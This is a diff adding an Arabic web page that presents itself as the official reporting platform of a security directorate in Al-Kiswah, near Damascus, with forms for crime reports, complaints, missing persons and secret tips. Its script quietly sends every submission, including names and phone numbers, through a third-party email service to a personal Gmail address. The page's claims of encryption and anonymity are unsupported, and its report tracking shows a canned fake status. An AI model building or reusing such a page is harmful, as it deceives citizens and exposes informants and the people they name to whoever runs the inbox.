@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مديرية الأمن - الكسوة</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root{--darker:#060910;--navy:#0d1b3e;--accent:#c8922a;--gold:#e8b84b;--text:#e8eaf0;--muted:#8a96b0;--border:rgba(200,146,42,0.2);--glass:rgba(13,27,62,0.6);--red:#c0392b;--green:#27ae60}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Tajawal',sans-serif;background:#060910;color:var(--text);min-height:100vh}
+.bg{position:fixed;inset:0;background:radial-gradient(ellipse at 20% 20%,rgba(26,58,107,0.4) 0%,transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(200,146,42,0.08) 0%,transparent 50%),linear-gradient(180deg,#060910,#0a0e1a)}
+.wrap{position:relative;z-index:1}
+header{background:rgba(6,9,16,0.98);border-bottom:1px solid var(--border);padding:16px 20px;display:flex;align-items:center;gap:14px;position:sticky;top:0;z-index:100}
+.logo{width:52px;height:52px;border:2px solid var(--accent);border-radius:50%;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle,rgba(26,58,107,0.8),rgba(6,9,16,0.9));font-size:22px;flex-shrink:0}
+.htitle{font-family:'Cairo',sans-serif;font-size:16px;font-weight:900;color:var(--gold)}
+.hsub{font-size:11px;color:var(--muted)}
+.hero{padding:40px 20px 30px;text-align:center}
+.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(200,146,42,0.08);border:1px solid rgba(200,146,42,0.25);padding:5px 14px;border-radius:100px;font-size:11px;color:var(--gold);margin-bottom:16px}
+.hero h1{font-family:'Cairo',sans-serif;font-size:26px;font-weight:900;color:#fff;margin-bottom:10px;line-height:1.3}
+.hero h1 span{color:var(--gold)}
+.hero p{color:var(--muted);font-size:13px;line-height:1.8;max-width:500px;margin:0 auto}
+.stats{display:flex;gap:6px;padding:20px;justify-content:center;flex-wrap:wrap}
+.stat{background:var(--glass);border:1px solid var(--border);border-radius:10px;padding:12px 16px;text-align:center;min-width:80px}
+.snum{font-family:'Cairo',sans-serif;font-size:18px;font-weight:900;color:var(--gold)}
+.slbl{font-size:10px;color:var(--muted)}
+.container{padding:0 16px 40px;max-width:700px;margin:0 auto}
+.card{background:var(--glass);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin-bottom:16px}
+.card-head{padding:16px 18px;border-bottom:1px solid var(--border);background:rgba(13,27,62,0.4);display:flex;align-items:center;gap:10px}
+.card-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.ci-blue{background:rgba(26,58,107,0.6);border:1px solid rgba(100,140,220,0.3)}
+.ci-gold{background:rgba(200,146,42,0.15);border:1px solid rgba(200,146,42,0.3)}
+.ci-red{background:rgba(192,57,43,0.15);border:1px solid rgba(192,57,43,0.3)}
+.card-title{font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;color:#fff}
+.card-sub{font-size:11px;color:var(--muted)}
+.tabs{display:flex;padding:12px 18px 0;gap:4px;border-bottom:1px solid rgba(200,146,42,0.1);overflow-x:auto}
+.tab{padding:8px 12px;border-radius:8px 8px 0 0;border:1px solid transparent;border-bottom:none;background:transparent;color:var(--muted);font-family:'Tajawal',sans-serif;font-size:12px;cursor:pointer;white-space:nowrap;position:relative;bottom:-1px}
+.tab.active{background:rgba(13,27,62,0.8);border-color:rgba(200,146,42,0.3);border-bottom-color:rgba(13,27,62,0.8);color:var(--gold)}
+.panel{display:none;padding:18px}
+.panel.active{display:block}
+.fg{display:flex;flex-direction:column;gap:6px;margin-bottom:14px}
+label{font-size:12px;color:var(--muted)}
+.req{color:var(--red)}
+input,select,textarea{background:rgba(6,9,16,0.7);border:1px solid rgba(200,146,42,0.15);border-radius:8px;padding:10px 12px;color:var(--text);font-family:'Tajawal',sans-serif;font-size:13px;outline:none;width:100%}
+input:focus,select:focus,textarea:focus{border-color:rgba(200,146,42,0.5);box-shadow:0 0 0 3px rgba(200,146,42,0.08)}
+select option{background:#0d1b3e}
+textarea{resize:vertical;min-height:100px;line-height:1.7}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.prio{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.po{padding:9px;border-radius:8px;border:1px solid rgba(255,255,255,0.08);text-align:center;cursor:pointer;font-size:12px;font-weight:600;transition:all 0.2s}
+.po.low{color:#3498db}.po.mid{color:#f39c12}.po.hi{color:var(--red)}
+.po.sel.low{background:rgba(52,152,219,0.15);border-color:rgba(52,152,219,0.4)}
+.po.sel.mid{background:rgba(243,156,18,0.15);border-color:rgba(243,156,18,0.4)}
+.po.sel.hi{background:rgba(192,57,43,0.15);border-color:rgba(192,57,43,0.4)}
+.anon{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(6,9,16,0.4);border:1px solid rgba(200,146,42,0.12);border-radius:10px;cursor:pointer;margin-bottom:14px}
+.sw{width:38px;height:20px;background:rgba(255,255,255,0.1);border-radius:100px;position:relative;transition:all 0.3s;flex-shrink:0}
+.sw::after{content:'';position:absolute;top:2px;right:2px;width:16px;height:16px;background:var(--muted);border-radius:50%;transition:all 0.3s}
+.sw.on{background:rgba(200,146,42,0.4)}.sw.on::after{right:auto;left:2px;background:var(--gold)}
+.sbtn{width:100%;padding:13px;background:linear-gradient(135deg,#c8922a,#e8b84b);border:none;border-radius:10px;color:#060910;font-family:'Cairo',sans-serif;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 20px rgba(200,146,42,0.3)}
+.hot{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(0,0,0,0.3);border-radius:10px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.05)}
+.hico{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.hem{background:rgba(192,57,43,0.3)}.hph{background:rgba(52,152,219,0.3)}
+.hnum{font-size:14px;font-weight:700;color:var(--gold);display:block}
+.hlab{font-size:11px;color:var(--muted)}
+.trow{display:flex;gap:8px;margin-bottom:10px}
+.trow input{flex:1}
+.tbtn{padding:10px 14px;background:rgba(200,146,42,0.15);border:1px solid rgba(200,146,42,0.3);border-radius:8px;color:var(--gold);cursor:pointer;font-family:'Tajawal',sans-serif;font-size:13px;font-weight:600;white-space:nowrap}
+.sres{display:none;padding:12px;border-radius:10px;border:1px solid rgba(39,174,96,0.3);background:rgba(39,174,96,0.08)}
+.sres.show{display:block}
+.sbadge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:100px;font-size:11px;font-weight:600;background:rgba(39,174,96,0.2);color:var(--green);border:1px solid rgba(39,174,96,0.3);margin-bottom:6px}
+.tip{display:flex;gap:8px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.04);align-items:flex-start}
+.tip:last-child{border:none}
+.tn{width:20px;height:20px;background:rgba(200,146,42,0.15);border:1px solid rgba(200,146,42,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--gold);font-weight:700;flex-shrink:0;margin-top:2px}
+.tt{font-size:12px;color:var(--muted);line-height:1.6}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:1000;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
+.overlay.show{display:flex}
+.modal{background:linear-gradient(135deg,#0d1b3e,#0a0e1a);border:1px solid rgba(200,146,42,0.4);border-radius:18px;padding:36px 28px;max-width:360px;width:90%;text-align:center}
+.mico{width:64px;height:64px;background:rgba(39,174,96,0.15);border:2px solid rgba(39,174,96,0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px}
+.modal h3{font-family:'Cairo',sans-serif;font-size:20px;font-weight:800;color:#fff;margin-bottom:8px}
+.modal p{color:var(--muted);font-size:13px;line-height:1.7;margin-bottom:16px}
+.ref{background:rgba(200,146,42,0.1);border:1px solid rgba(200,146,42,0.3);border-radius:10px;padding:12px;margin-bottom:18px}
+.ref small{font-size:10px;color:var(--muted);display:block;margin-bottom:3px}
+.ref strong{font-size:18px;color:var(--gold);font-family:'Cairo',sans-serif;letter-spacing:2px}
+.mcls{padding:11px 28px;background:linear-gradient(135deg,#c8922a,#e8b84b);border:none;border-radius:8px;color:#060910;font-family:'Cairo',sans-serif;font-size:14px;font-weight:700;cursor:pointer}
+footer{border-top:1px solid var(--border);padding:20px;text-align:center;font-size:11px;color:var(--muted)}
+@media(max-width:500px){.row2{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="wrap">
+<header>
+<div class="logo">🛡️</div>
+<div>
+<div class="htitle">مديرية الأمن — الكسوة</div>
+<div class="hsub">بريف دمشق | منصة التبليغ والشكاوى الأمنية</div>
+</div>
+</header>
+<div class="hero">
+<div class="badge">🔒 منصة رسمية آمنة ومشفرة</div>
+<h1>بلّغ عن أي <span>حادثة أمنية</span><br>بسهولة وسرية تامة</h1>
+<p>منصة إلكترونية رسمية تابعة لمديرية الأمن في الكسوة، تتيح للمواطنين تقديم البلاغات الأمنية بشكل آمن على مدار الساعة.</p>
+</div>
+<div class="stats">
+<div class="stat"><div class="snum">24/7</div><div class="slbl">خدمة مستمرة</div></div>
+<div class="stat"><div class="snum">100%</div><div class="slbl">سرية مضمونة</div></div>
+<div class="stat"><div class="snum">🔒</div><div class="slbl">تشفير كامل</div></div>
+<div class="stat"><div class="snum">✅</div><div class="slbl">تتبع فوري</div></div>
+</div>
+<div class="container">
+<!-- بلاغ -->
+<div class="card">
+<div class="card-head"><div class="card-icon ci-blue">📋</div><div><div class="card-title">تقديم بلاغ أو شكوى</div><div class="card-sub">اختر النوع وأدخل التفاصيل</div></div></div>
+<div class="tabs">
+<button class="tab active" onclick="sw(this,'s')">🚨 بلاغ أمني</button>
+<button class="tab" onclick="sw(this,'c')">📝 شكوى</button>
+<button class="tab" onclick="sw(this,'m')">🔎 مفقود</button>
+<button class="tab" onclick="sw(this,'i')">💡 معلومة</button>
+</div>
+<!-- أمني -->
+<div class="panel active" id="ps">
+<div class="anon" onclick="tog()"><div class="sw" id="sw"></div><div><strong style="font-size:13px;display:block;color:var(--text)">تقديم مجهول</strong><small style="font-size:11px;color:var(--muted)">هويتك مشفرة بالكامل</small></div></div>
+<div id="pf">
+<div class="row2">
+<div class="fg"><label>الاسم <span class="req">*</span></label><input type="text" placeholder="اسمك الكامل"></div>
+<div class="fg"><label>رقم الهاتف <span class="req">*</span></label><input type="tel" placeholder="09XXXXXXXX"></div>
+</div>
+</div>
+<div class="row2">
+<div class="fg"><label>نوع الحادثة <span class="req">*</span></label><select><option>— اختر —</option><option>سرقة/نشل</option><option>اعتداء جسدي</option><option>تهديد وابتزاز</option><option>نشاط مشبوه</option><option>تهريب/مخدرات</option><option>أسلحة غير مرخصة</option><option>جرائم إلكترونية</option><option>إرهاب/تطرف</option><option>أخرى</option></select></div>
+<div class="fg"><label>المنطقة <span class="req">*</span></label><select><option>— اختر —</option><option>الكسوة - المركز</option><option>الكسوة - الشمالية</option><option>الكسوة - الجنوبية</option><option>سعسع</option><option>خربة غزالة</option><option>الصبورة</option><option>عدرا</option><option>الديماس</option><option>قطنا</option><option>منطقة أخرى</option></select></div>
+</div>
+<div class="row2">
+<div class="fg"><label>تاريخ الحادثة <span class="req">*</span></label><input type="date"></div>
+<div class="fg"><label>الوقت التقريبي</label><input type="time"></div>
+</div>
+<div class="fg"><label>العنوان التفصيلي</label><input type="text" placeholder="مثال: شارع الجمهورية، قرب المسجد الكبير"></div>
+<div class="fg"><label>وصف الحادثة <span class="req">*</span></label><textarea placeholder="اذكر التفاصيل، أوصاف المشتبه بهم، المركبات..."></textarea></div>
+<div class="fg" style="margin-bottom:16px"><label>مستوى الأولوية</label>
+<div class="prio">
+<div class="po low" onclick="sp(this)">🔵 عادي</div>
+<div class="po mid sel" onclick="sp(this)">🟡 متوسط</div>
+<div class="po hi" onclick="sp(this)">🔴 عاجل</div>
+</div></div>
+<button class="sbtn" onclick="sub()">🛡️ إرسال البلاغ الآن</button>
+<div style="text-align:center;font-size:11px;color:var(--muted);margin-top:8px">🔒 بياناتك مشفرة | سيصلك رقم مرجعي</div>
+</div>
+<!-- شكوى -->
+<div class="panel" id="pc">
+<div class="row2">
+<div class="fg"><label>الاسم <span class="req">*</span></label><input type="text" placeholder="اسمك الكامل"></div>
+<div class="fg"><label>الهاتف <span class="req">*</span></label><input type="tel" placeholder="09XXXXXXXX"></div>
+</div>
+<div class="fg"><label>موضوع الشكوى <span class="req">*</span></label><select><option>— اختر —</option><option>شكوى ضد موظف</option><option>إهمال في البلاغات</option><option>تأخر في الاستجابة</option><option>سوء معاملة</option><option>شكوى إدارية</option><option>أخرى</option></select></div>
+<div class="fg"><label>تفاصيل الشكوى <span class="req">*</span></label><textarea placeholder="اشرح شكواك بالتفصيل..."></textarea></div>
+<button class="sbtn" onclick="sub()">📝 تقديم الشكوى</button>
+</div>
+<!-- مفقود -->
+<div class="panel" id="pm">
+<div class="row2">
+<div class="fg"><label>اسم المفقود <span class="req">*</span></label><input type="text" placeholder="الاسم الكامل"></div>
+<div class="fg"><label>العمر</label><input type="number" placeholder="بالسنوات"></div>
+</div>
+<div class="row2">
+<div class="fg"><label>الجنس</label><select><option>ذكر</option><option>أنثى</option></select></div>
+<div class="fg"><label>تاريخ الاختفاء <span class="req">*</span></label><input type="date"></div>
+</div>
+<div class="fg"><label>المكان الأخير <span class="req">*</span></label><input type="text" placeholder="مثال: سوق الكسوة المركزي"></div>
+<div class="fg"><label>الوصف الجسدي والملابس</label><textarea placeholder="لون الشعر، الطول، الملابس..."></textarea></div>
+<button class="sbtn" onclick="sub()">🔎 تقديم بلاغ مفقود</button>
+</div>
+<!-- معلومة -->
+<div class="panel" id="pi">
+<div style="background:rgba(200,146,42,0.07);border:1px solid rgba(200,146,42,0.2);border-radius:10px;padding:12px;margin-bottom:14px">
+<p style="font-size:12px;color:var(--gold);font-weight:600">🔐 معلومات سرية للغاية</p>
+<p style="font-size:11px;color:var(--muted);margin-top:4px">لن يتم الكشف عن هويتك لأي جهة</p>
+</div>
+<div class="fg"><label>الفئة</label><select><option>— اختر —</option><option>نشاط مشبوه</option><option>أماكن مشبوهة</option><option>تهريب بضائع/أسلحة</option><option>تمويل مشبوه</option><option>نشاط إلكتروني مشبوه</option><option>جرائم مخططة</option></select></div>
+<div class="fg"><label>تفاصيل المعلومة <span class="req">*</span></label><textarea placeholder="أشخاص، أماكن، أوقات، وسائل اتصال..." style="min-height:120px"></textarea></div>
+<button class="sbtn" onclick="sub()">🔒 إرسال المعلومة بسرية</button>
+</div>
+</div>
+<!-- طوارئ -->
+<div class="card">
+<div class="card-head"><div class="card-icon ci-red">🚨</div><div><div class="card-title">خطوط الطوارئ</div><div class="card-sub">للحوادث العاجلة فقط</div></div></div>
+<div style="padding:16px">
+<div class="hot"><div class="hico hem">🚔</div><div><span class="hnum">112</span><span class="hlab">الشرطة — طوارئ عامة</span></div></div>
+<div class="hot"><div class="hico hph">📞</div><div><span class="hnum">011-31XXXXXX</span><span class="hlab">مديرية أمن الكسوة</span></div></div>
+<div class="hot"><div class="hico hem">🔥</div><div><span class="hnum">113</span><span class="hlab">الإسعاف والإطفاء</span></div></div>
+</div>
+</div>
+<!-- تتبع -->
+<div class="card">
+<div class="card-head"><div class="card-icon ci-gold">🔍</div><div><div class="card-title">تتبع بلاغك</div><div class="card-sub">أدخل الرقم المرجعي</div></div></div>
+<div style="padding:16px">
+<div class="trow"><input type="text" id="ti" placeholder="KSW-XXXX-XXXX" style="direction:ltr;text-align:center;letter-spacing:2px"><button class="tbtn" onclick="tr()">تتبع</button></div>
+<div class="sres" id="sr">
+<div class="sbadge">✅ قيد المعالجة</div>
+<div style="font-size:12px;color:var(--muted);line-height:1.6"><strong style="color:var(--text);display:block;margin-bottom:4px">بلاغ: سرقة منزل</strong>تاريخ التقديم: 10 مارس 2026<br>المسؤول: النقيب أحمد العلي<br>آخر تحديث: قبل 3 ساعات</div>
+</div>
+</div>
+</div>
+<!-- إرشادات -->
+<div class="card">
+<div class="card-head"><div class="card-icon ci-blue">💡</div><div><div class="card-title">إرشادات التبليغ</div><div class="card-sub">لضمان سرعة الاستجابة</div></div></div>
+<div style="padding:12px 16px 16px">
+<div class="tip"><div class="tn">١</div><div class="tt">كن دقيقاً في وصف الموقع والوقت قدر الإمكان</div></div>
+<div class="tip"><div class="tn">٢</div><div class="tt">أرفق الصور والأدلة لتسريع المعالجة</div></div>
+<div class="tip"><div class="tn">٣</div><div class="tt">احتفظ برقمك المرجعي لمتابعة الحالة</div></div>
+<div class="tip"><div class="tn">٤</div><div class="tt">للحوادث الحرجة اتصل فوراً بخط الطوارئ 112</div></div>
+<div class="tip"><div class="tn">٥</div><div class="tt">يمكنك التبليغ بشكل مجهول دون أي مخاوف</div></div>
+</div>
+</div>
+</div>
+<footer>© 2026 مديرية الأمن — الكسوة، بريف دمشق | جميع الحقوق محفوظة</footer>
+</div>
+<div class="overlay" id="mo">
+<div class="modal">
+<div class="mico">✅</div>
+<h3>تم إرسال بلاغك بنجاح</h3>
+<p>سيتم مراجعة بلاغك من قبل الجهات المختصة في أقرب وقت ممكن.</p>
+<div class="ref"><small>الرقم المرجعي</small><strong id="rn">KSW-2026-XXXX</strong></div>
+<button class="mcls" onclick="document.getElementById('mo').classList.remove('show')">حسناً، تم الفهم</button>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+emailjs.init('kxBcILlHwHeXuVGg_');
+let anon=false;
+function tog(){anon=!anon;document.getElementById('sw').classList.toggle('on',anon);document.getElementById('pf').style.display=anon?'none':'block'}
+function sw(el,id){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));el.classList.add('active');document.getElementById('p'+id).classList.add('active')}
+function sp(el){document.querySelectorAll('.po').forEach(o=>o.classList.remove('sel'));el.classList.add('sel')}
+
+function getPriority(){const s=document.querySelector('.po.sel');return s?s.textContent.trim():'متوسط'}
+function getActiveTab(){const t=document.querySelector('.tab.active');return t?t.textContent.trim():'بلاغ أمني'}
+
+function sub(){
+  const c='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let r='KSW-2026-';
+  for(let i=0;i<4;i++)r+=c[Math.floor(Math.random()*c.length)];
+
+  // جمع البيانات من النموذج
+  const inputs=document.querySelectorAll('.panel.active input, .panel.active select, .panel.active textarea');
+  let name='مجهول', phone='—', incident_type=getActiveTab(), region='—', incident_date='—', description='—';
+  inputs.forEach(inp=>{
+    const ph=inp.placeholder||'';
+    const val=inp.value||'';
+    if(!val)return;
+    if(inp.type==='text'&&(ph.includes('اسم')||ph.includes('الاسم')))name=val;
+    if(inp.type==='tel')phone=val;
+    if(inp.tagName==='SELECT'&&inp.querySelector('option:checked')&&!inp.querySelector('option:checked').value.includes('اختر')){
+      if(!region||region==='—')region=inp.value;
+      else incident_type=inp.value;
+    }
+    if(inp.type==='date')incident_date=val;
+    if(inp.tagName==='TEXTAREA')description=val;
+  });
+
+  const params={
+    name: anon?'مجهول':name,
+    phone: anon?'مجهول':phone,
+    incident_type: incident_type,
+    region: region,
+    incident_date: incident_date,
+    description: description||'لم يتم إدخال وصف',
+    priority: getPriority(),
+    ref_number: r,
+    email: 'ahmdalksndr11@gmail.com'
+  };
+
+  // إظهار رسالة الإرسال
+  document.getElementById('rn').textContent=r;
+  document.getElementById('mo').classList.add('show');
+
+  // إرسال البريد
+  emailjs.send('service_ojc3jw4','template_9iubzwz', params)
+    .then(()=>console.log('تم الإرسال بنجاح'))
+    .catch(e=>console.error('خطأ في الإرسال:',e));
+}
+
+function tr(){const v=document.getElementById('ti').value.trim();const r=document.getElementById('sr');if(v.length>5)r.classList.add('show');else{r.classList.remove('show');document.getElementById('ti').style.borderColor='rgba(192,57,43,0.5)';setTimeout(()=>document.getElementById('ti').style.borderColor='',1500)}}
+document.getElementById('ti').addEventListener('keydown',e=>{if(e.key==='Enter')tr()});
+</script>
+</body>
+</html>
